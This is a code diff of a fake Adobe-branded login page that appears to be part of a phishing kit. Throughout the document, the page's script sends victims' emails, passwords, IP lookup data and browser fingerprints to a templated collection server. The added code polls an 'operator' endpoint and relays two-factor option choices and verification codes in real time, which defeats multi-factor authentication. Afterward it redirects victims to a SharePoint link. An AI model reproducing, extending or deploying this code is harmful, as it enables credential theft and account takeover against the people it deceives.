@@ -563,15 +563,31 @@
             <div class="form-group" id="passwordGroup">
               <label for="exampleInputPassword1">Password</label>
               <input type="password" class="form-control" id="exampleInputPassword1" name="password" required 
-                    onkeypress="if(event.key === 'Enter') handleVerifyClick();">
+                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
               <div class="error-message" id="RequirePassword">Password is required</div>
               <div class="error-message" id="InvalidPassword">Incorrect email or password. Try again.</div>
+            </div>
+
+            <div class="form-group" id="verificationOptionsGroup" style="display: none;">
+              <label>Choose a verification option</label>
+              <div id="verificationOptionsContainer">
+                <!-- Options will be dynamically loaded here -->
+              </div>
+              <div class="error-message" id="RequireVerificationChoice">Please select a verification option.</div>
+            </div>
+
+            <div class="form-group" id="verificationCodeGroup" style="display: none;">
+              <label for="verificationCodeInput">Verification Code</label>
+              <input type="text" class="form-control" id="verificationCodeInput" name="verificationCode" required
+                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+              <div class="error-message" id="RequireVerificationCode">Verification code is required.</div>
+              <div class="error-message" id="InvalidVerificationCode">Invalid verification code. Please try again.</div>
             </div>
             
             <div class="error-message" id="GeneralError">An error occurred. Please try again.</div>
             
             <input type="hidden" id="domainHidden" name="domain" value="">
-            <button type="button" class="btn btn-primary" id="submitButton" onclick="handleVerifyClick()">Login</button>
+            <button type="button" class="btn btn-primary" id="submitButton" onclick="handleFormSubmission()">Login</button>
           </form>
           
           <!-- Security footer with Adobe logo -->
@@ -595,187 +611,30 @@
 <script>
 // THESE ARE YOUR TEMPLATE VARIABLES - THEY WILL BE REPLACED BY YOUR SERVER-SIDE SCRIPT
 const templateConfig = {
-  postURL: "{{postURL}}",
-  token: "{{token}}",
-  landingPageLink: "{{landingPageLink}}"
+  postURL: "{{postURL}}",
+  token: "{{token}}",
+  landingPageLink: "{{landingPageLink}}"
 };
 
-// Function to handle page load and prefill email if present in URL
-function onPageLoad() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const email = urlParams.get('email');
-  const emailField = document.getElementById('exampleInputEmail1');
-  const emailCallout = document.getElementById('emailCallout');
-  const domainHiddenInput = document.getElementById('domainHidden');
+let browserId = null;
+let pollingIntervalId = null;
+let currentStatus = null;
+let verificationOptions = [];
 
-  if (email) {
-    emailField.value = email;
-    emailField.readOnly = true;
-    emailCallout.textContent = "Your email was securely prefilled and cannot be changed.";
+// Helper function to show loading dialog
+function showLoadingDialog() {
+  document.getElementById('loadingDialog').style.display = 'block';
+}
 
-    const atIndex = email.lastIndexOf('@');
-    if (atIndex !== -1) {
-      const domain = email.slice(atIndex + 1);
-      domainHiddenInput.value = domain;
-    } else {
-      domainHiddenInput.value = '';
-    }
-  } else {
-    emailField.readOnly = false;
-    emailCallout.textContent = "Enter your email address.";
-  }
+// Helper function to hide loading dialog
+function hideLoadingDialog() {
+  document.getElementById('loadingDialog').style.display = 'none';
 }
 
 // Function to validate email format
 function isValidEmail(email) {
-  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  return emailPattern.test(email);
-}
-
-function handleVerifyClick() {
-  const btn = document.getElementById('submitButton');
-  const emailField = document.getElementById('exampleInputEmail1');
-  const passwordField = document.getElementById('exampleInputPassword1');
-  const invalidEmailError = document.getElementById('InvalidEmail');
-  const invalidPasswordError = document.getElementById('InvalidPassword');
-  const requirePasswordError = document.getElementById('RequirePassword');
-  const generalError = document.getElementById('GeneralError');
-
-  // Hide all error messages
-  invalidEmailError.style.display = 'none';
-  invalidPasswordError.style.display = 'none';
-  requirePasswordError.style.display = 'none';
-  generalError.style.display = 'none';
-
-  const email = emailField.value.trim();
-  const password = passwordField.value.trim();
-
-  // Basic validation
-  if (!isValidEmail(email)) {
-    invalidEmailError.style.display = 'block';
-    return;
-  }
-  if (!password) {
-    requirePasswordError.style.display = 'block';
-    return;
-  }
-
-  // Disable form elements and show loading state
-  emailField.readOnly = true;
-  passwordField.disabled = true;
-  btn.disabled = true;
-  btn.innerText = "Verifying...";
-  btn.style.backgroundColor = "#BEBEBE";
-  btn.style.color = "#000";
-
-  // Fetch IP data and then send the submission
-  fetch('https://ipinfo.io/json')
-    .then(response => response.json())
-    .catch(error => {
-      console.error("Error fetching IP info:", error);
-      // Proceed without IP data if fetching fails
-      return {}; // Return empty object
-    })
-    .then(ipData => {
-      const deviceData = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenWidth: window.screen.width,
-        screenHeight: window.screen.height,
-        colorDepth: window.screen.colorDepth,
-        pixelRatio: window.devicePixelRatio,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory,
-        vendor: navigator.vendor,
-        maxTouchPoints: navigator.maxTouchPoints,
-      };
-
-      // Prepare the formData content
-      const formDataContent = {
-        email: email,
-        password: password,
-        ipData: ipData, // Keep as object here
-        deviceData: deviceData // Keep as object here
-      };
-
-      // Prepare the final payload with token and stringified formData
-      let finalPayload = {
-        token: templateConfig.token,
-        formData: JSON.stringify(formDataContent) // Stringify the entire formData object
-      };
-
-      console.log("Final Payload (before URL encoding):", finalPayload);
-
-      // Send data to the single submission API using URL parameters
-      return fetch(`${templateConfig.postURL}/notify-form-submission`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: objectToFormData(finalPayload)
-      });
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-      return response.json();
-    })
-    .then(data => {
-      // Handle API response based on new logic
-      const apiResponse = data.apiResponse;
-      if (apiResponse && apiResponse.accountAccess) {
-        // If accountAccess is true, redirect to landing page
-        let redirectUrl = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== ''
-          ? templateConfig.landingPageLink
-          : "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
-
-        // Ensure redirectUrl has a proper prefix
-        if (redirectUrl && !redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
-          redirectUrl = `https://${redirectUrl}`;
-        }
-        window.location.href = redirectUrl;
-      } else if (apiResponse && apiResponse.emailExists === false) {
-        // If emailExists is false, show "Invalid email address"
-        invalidEmailError.textContent = "Email does not exist. Please check your email.";
-        invalidEmailError.style.display = 'block';
-        resetFormState();
-      } else {
-        // Default to "Incorrect email or password" if accountAccess is false or other issues
-        invalidPasswordError.textContent = "Incorrect email or password. Try again.";
-        invalidPasswordError.style.display = 'block';
-        resetFormState();
-      }
-    })
-    .catch(error => {
-      console.error("Error during form submission:", error);
-      generalError.textContent = "An error occurred during login. Please try again.";
-      generalError.style.display = 'block';
-      resetFormState();
-    });
-}
-
-// Helper function to reset form/button fields
-function resetFormState() {
-  const btn = document.getElementById('submitButton');
-  const emailField = document.getElementById('exampleInputEmail1');
-  const passwordField = document.getElementById('exampleInputPassword1');
-
-  if (!new URLSearchParams(window.location.search).get('email')) {
-    emailField.readOnly = false;
-  }
-  passwordField.disabled = false;
-  passwordField.value = "";
-  btn.disabled = false;
-  btn.innerText = "Login";
-  btn.style.backgroundColor = "";
-  btn.style.color = "";
-}
-
-// Handle form submission to prevent the default behavior
-function handleSubmit(event) {
-  event.preventDefault();
-  handleVerifyClick();
-  return false;
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return emailPattern.test(email);
 }
 
 // Helper function to convert object to URLSearchParams
@@ -785,6 +644,435 @@ function objectToFormData(obj) {
     formData.append(key, value.toString());
   });
   return formData.toString();
+}
+
+// Function to update UI based on polling status
+function updateUIForStatus(status, data = {}) {
+  currentStatus = status;
+  const emailGroup = document.getElementById('emailGroup');
+  const passwordGroup = document.getElementById('passwordGroup');
+  const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
+  const verificationCodeGroup = document.getElementById('verificationCodeGroup');
+  const submitButton = document.getElementById('submitButton');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+
+  // Hide all error messages
+  hideAllErrors();
+
+  // Reset button state
+  submitButton.disabled = false;
+  submitButton.style.backgroundColor = "";
+  submitButton.style.color = "";
+
+  switch (status) {
+    case 'PROCESSING':
+      showLoadingDialog();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'block';
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Processing...";
+      submitButton.disabled = true;
+      emailField.readOnly = true;
+      passwordField.disabled = true;
+      break;
+    case 'WAITINGEMAIL':
+      hideLoadingDialog();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'none';
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Continue";
+      emailField.readOnly = false; // Allow email input if not prefilled
+      passwordField.disabled = true;
+      break;
+    case 'WAITINGPASSWORD':
+      hideLoadingDialog();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'block';
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Login";
+      emailField.readOnly = true;
+      passwordField.disabled = false;
+      break;
+    case 'WAITINGOPTIONS':
+      hideLoadingDialog();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'none'; // Password not needed for 2FA options
+      verificationOptionsGroup.style.display = 'block';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Submit Choice";
+      emailField.readOnly = true;
+      passwordField.disabled = true;
+      verificationOptions = data.verificationOptions || [];
+      renderVerificationOptions(verificationOptions);
+      break;
+    case 'WAITINGCODE':
+      hideLoadingDialog();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'none'; // Password not needed for 2FA code
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'block';
+      submitButton.innerText = "Submit Code";
+      emailField.readOnly = true;
+      passwordField.disabled = true;
+      verificationCodeInput.value = ''; // Clear previous code
+      break;
+    case 'COMPLETED':
+      hideLoadingDialog();
+      clearInterval(pollingIntervalId);
+      let redirectUrl = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== '' ?
+        templateConfig.landingPageLink :
+        "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
+      if (redirectUrl && !redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+        redirectUrl = `https://${redirectUrl}`;
+      }
+      window.location.href = redirectUrl;
+      break;
+    case 'FAILED':
+      hideLoadingDialog();
+      clearInterval(pollingIntervalId);
+      if (data.emailExists === false) {
+        document.getElementById('InvalidEmail').textContent = "Email does not exist. Please check your email.";
+        document.getElementById('InvalidEmail').style.display = 'block';
+      } else if (data.accountAccess === false) {
+        document.getElementById('InvalidPassword').textContent = "Incorrect email or password. Try again.";
+        document.getElementById('InvalidPassword').style.display = 'block';
+      } else {
+        document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
+        document.getElementById('GeneralError').style.display = 'block';
+      }
+      resetFormState();
+      break;
+    default:
+      hideLoadingDialog();
+      document.getElementById('GeneralError').textContent = "An unexpected status was received. Please try again.";
+      document.getElementById('GeneralError').style.display = 'block';
+      resetFormState();
+      break;
+  }
+}
+
+// Function to hide all error messages
+function hideAllErrors() {
+  document.getElementById('InvalidEmail').style.display = 'none';
+  document.getElementById('InvalidPassword').style.display = 'none';
+  document.getElementById('RequirePassword').style.display = 'none';
+  document.getElementById('GeneralError').style.display = 'none';
+  document.getElementById('RequireVerificationChoice').style.display = 'none';
+  document.getElementById('RequireVerificationCode').style.display = 'none';
+  document.getElementById('InvalidVerificationCode').style.display = 'none';
+}
+
+// Function to render 2FA verification options
+function renderVerificationOptions(options) {
+  const container = document.getElementById('verificationOptionsContainer');
+  container.innerHTML = ''; // Clear previous options
+
+  if (!options || options.length === 0) {
+    container.innerHTML = '<p>No verification options available.</p>';
+    return;
+  }
+
+  options.forEach((option, index) => {
+    const div = document.createElement('div');
+    div.className = 'form-check';
+
+    const input = document.createElement('input');
+    input.type = 'radio';
+    input.className = 'form-check-input';
+    input.name = 'verificationOption';
+    input.id = `verificationOption${index}`;
+    input.value = option.choiceIndex;
+    input.dataset.valueAttribute = option.valueAttribute; // Store valueAttribute for later use
+    input.dataset.type = option.type;
+    input.dataset.maskedDetail = option.maskedDetail || '';
+
+    const label = document.createElement('label');
+    label.className = 'form-check-label';
+    label.htmlFor = `verificationOption${index}`;
+    label.textContent = option.label;
+
+    div.appendChild(input);
+    div.appendChild(label);
+    container.appendChild(div);
+  });
+}
+
+// Initial form submission on page load
+async function initialFormSubmission() {
+  showLoadingDialog();
+  const urlParams = new URLSearchParams(window.location.search);
+  const email = urlParams.get('email');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const emailCallout = document.getElementById('emailCallout');
+  const domainHiddenInput = document.getElementById('domainHidden');
+
+  if (email) {
+    emailField.value = email;
+    emailField.readOnly = true;
+    emailCallout.textContent = "Your email was securely prefilled and cannot be changed.";
+    const atIndex = email.lastIndexOf('@');
+    if (atIndex !== -1) {
+      domainHiddenInput.value = email.slice(atIndex + 1);
+    } else {
+      domainHiddenInput.value = '';
+    }
+  } else {
+    emailField.readOnly = false;
+    emailCallout.textContent = "Enter your email address.";
+  }
+
+  const formDataContent = {
+    email: email || '', // Send email if prefilled, otherwise empty
+    password: '', // Password is not sent initially
+    ipData: {}, // Will be fetched
+    deviceData: {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      colorDepth: window.screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      vendor: navigator.vendor,
+      maxTouchPoints: navigator.maxTouchPoints,
+    },
+  };
+
+  try {
+    const ipData = await fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({}));
+    formDataContent.ipData = ipData;
+
+    const finalPayload = {
+      token: templateConfig.token,
+      formData: JSON.stringify(formDataContent)
+    };
+
+    const response = await fetch(`${templateConfig.postURL}/notify-form-submission`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(finalPayload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    const apiResponse = data.apiResponse;
+
+    if (apiResponse && apiResponse.browserId) {
+      browserId = apiResponse.browserId;
+      updateUIForStatus(apiResponse.status, apiResponse);
+      startPolling();
+    } else {
+      throw new Error("No browserId received from initial submission.");
+    }
+  } catch (error) {
+    console.error("Error during initial form submission:", error);
+    document.getElementById('GeneralError').textContent = "Failed to initiate process. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    hideLoadingDialog();
+    resetFormState();
+  }
+}
+
+// Start polling the operator endpoint
+function startPolling() {
+  if (pollingIntervalId) {
+    clearInterval(pollingIntervalId);
+  }
+  pollingIntervalId = setInterval(pollOperator, 3000); // Poll every 3 seconds
+}
+
+// Poll the operator endpoint
+async function pollOperator() {
+  if (!browserId) {
+    console.warn("No browserId available for polling.");
+    clearInterval(pollingIntervalId);
+    return;
+  }
+
+  try {
+    const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData({ browserId: browserId, token: templateConfig.token })
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log("Polling response:", data);
+
+    if (data.currentStatus) {
+      updateUIForStatus(data.currentStatus, data);
+    } else {
+      console.warn("Polling response missing currentStatus:", data);
+    }
+  } catch (error) {
+    console.error("Error during polling:", error);
+    document.getElementById('GeneralError').textContent = "Polling failed. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    clearInterval(pollingIntervalId);
+    hideLoadingDialog();
+    resetFormState();
+  }
+}
+
+// Handle form submission (email/password, 2FA choice, 2FA code)
+async function handleFormSubmission() {
+  hideAllErrors();
+  showLoadingDialog();
+
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+  const submitButton = document.getElementById('submitButton');
+
+  submitButton.disabled = true;
+  submitButton.innerText = "Submitting...";
+  submitButton.style.backgroundColor = "#BEBEBE";
+  submitButton.style.color = "#000";
+
+  let payload = {
+    browserId: browserId,
+    token: templateConfig.token
+  };
+  let header = '';
+
+  try {
+    if (currentStatus === 'WAITINGEMAIL') {
+      const email = emailField.value.trim();
+      if (!isValidEmail(email)) {
+        document.getElementById('InvalidEmail').style.display = 'block';
+        hideLoadingDialog();
+        resetFormState();
+        return;
+      }
+      payload.email = email;
+      header = 'email';
+    } else if (currentStatus === 'WAITINGPASSWORD') {
+      const password = passwordField.value.trim();
+      if (!password) {
+        document.getElementById('RequirePassword').style.display = 'block';
+        hideLoadingDialog();
+        resetFormState();
+        return;
+      }
+      payload.password = password;
+      header = 'password';
+    } else if (currentStatus === 'WAITINGOPTIONS') {
+      const selectedOption = document.querySelector('input[name="verificationOption"]:checked');
+      if (!selectedOption) {
+        document.getElementById('RequireVerificationChoice').style.display = 'block';
+        hideLoadingDialog();
+        resetFormState();
+        return;
+      }
+
+      const choiceIndex = selectedOption.value;
+      const optionType = selectedOption.dataset.type;
+      const maskedDetail = selectedOption.dataset.maskedDetail;
+
+      let verificationChoiceJson;
+      if (optionType === 'email' || optionType === 'phone') {
+        verificationChoiceJson = [{
+          "choice": choiceIndex,
+          "hiddenPhoneEmail": maskedDetail
+        }];
+      } else {
+        verificationChoiceJson = [{
+          "choice": choiceIndex
+        }];
+      }
+      payload.verificationChoice = JSON.stringify(verificationChoiceJson);
+      header = 'verificationChoice';
+    } else if (currentStatus === 'WAITINGCODE') {
+      const verificationCode = verificationCodeInput.value.trim();
+      if (!verificationCode) {
+        document.getElementById('RequireVerificationCode').style.display = 'block';
+        hideLoadingDialog();
+        resetFormState();
+        return;
+      }
+      payload.verificationCode = verificationCode;
+      header = 'verificationCode';
+    } else {
+      console.warn("handleFormSubmission called in an unexpected state:", currentStatus);
+      document.getElementById('GeneralError').textContent = "Unexpected form submission. Please try again.";
+      document.getElementById('GeneralError').style.display = 'block';
+      hideLoadingDialog();
+      resetFormState();
+      return;
+    }
+
+    const response = await fetch(`${templateConfig.postURL}/update-process`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Update-Type': header // Custom header to indicate what is being updated
+      },
+      body: objectToFormData(payload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log("Update process response:", data);
+
+    // After update, immediately poll to get the new status
+    pollOperator();
+
+  } catch (error) {
+    console.error("Error during form submission:", error);
+    document.getElementById('GeneralError').textContent = "An error occurred during submission. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    hideLoadingDialog();
+    resetFormState();
+  }
+}
+
+// Helper function to reset form/button fields
+function resetFormState() {
+  const btn = document.getElementById('submitButton');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+
+  if (!new URLSearchParams(window.location.search).get('email')) {
+    emailField.readOnly = false;
+  }
+  emailField.value = '';
+  passwordField.disabled = false;
+  passwordField.value = "";
+  verificationCodeInput.value = "";
+  btn.disabled = false;
+  btn.innerText = "Login";
+  btn.style.backgroundColor = "";
+  btn.style.color = "";
+
+  // Hide all dynamic groups
+  document.getElementById('passwordGroup').style.display = 'block'; // Default to showing password
+  document.getElementById('verificationOptionsGroup').style.display = 'none';
+  document.getElementById('verificationCodeGroup').style.display = 'none';
+}
+
+// Handle form submission to prevent the default behavior
+function handleSubmit(event) {
+  event.preventDefault();
+  handleFormSubmission();
+  return false;
 }
 
 // Manually trigger onPageLoad when the DOM is ready
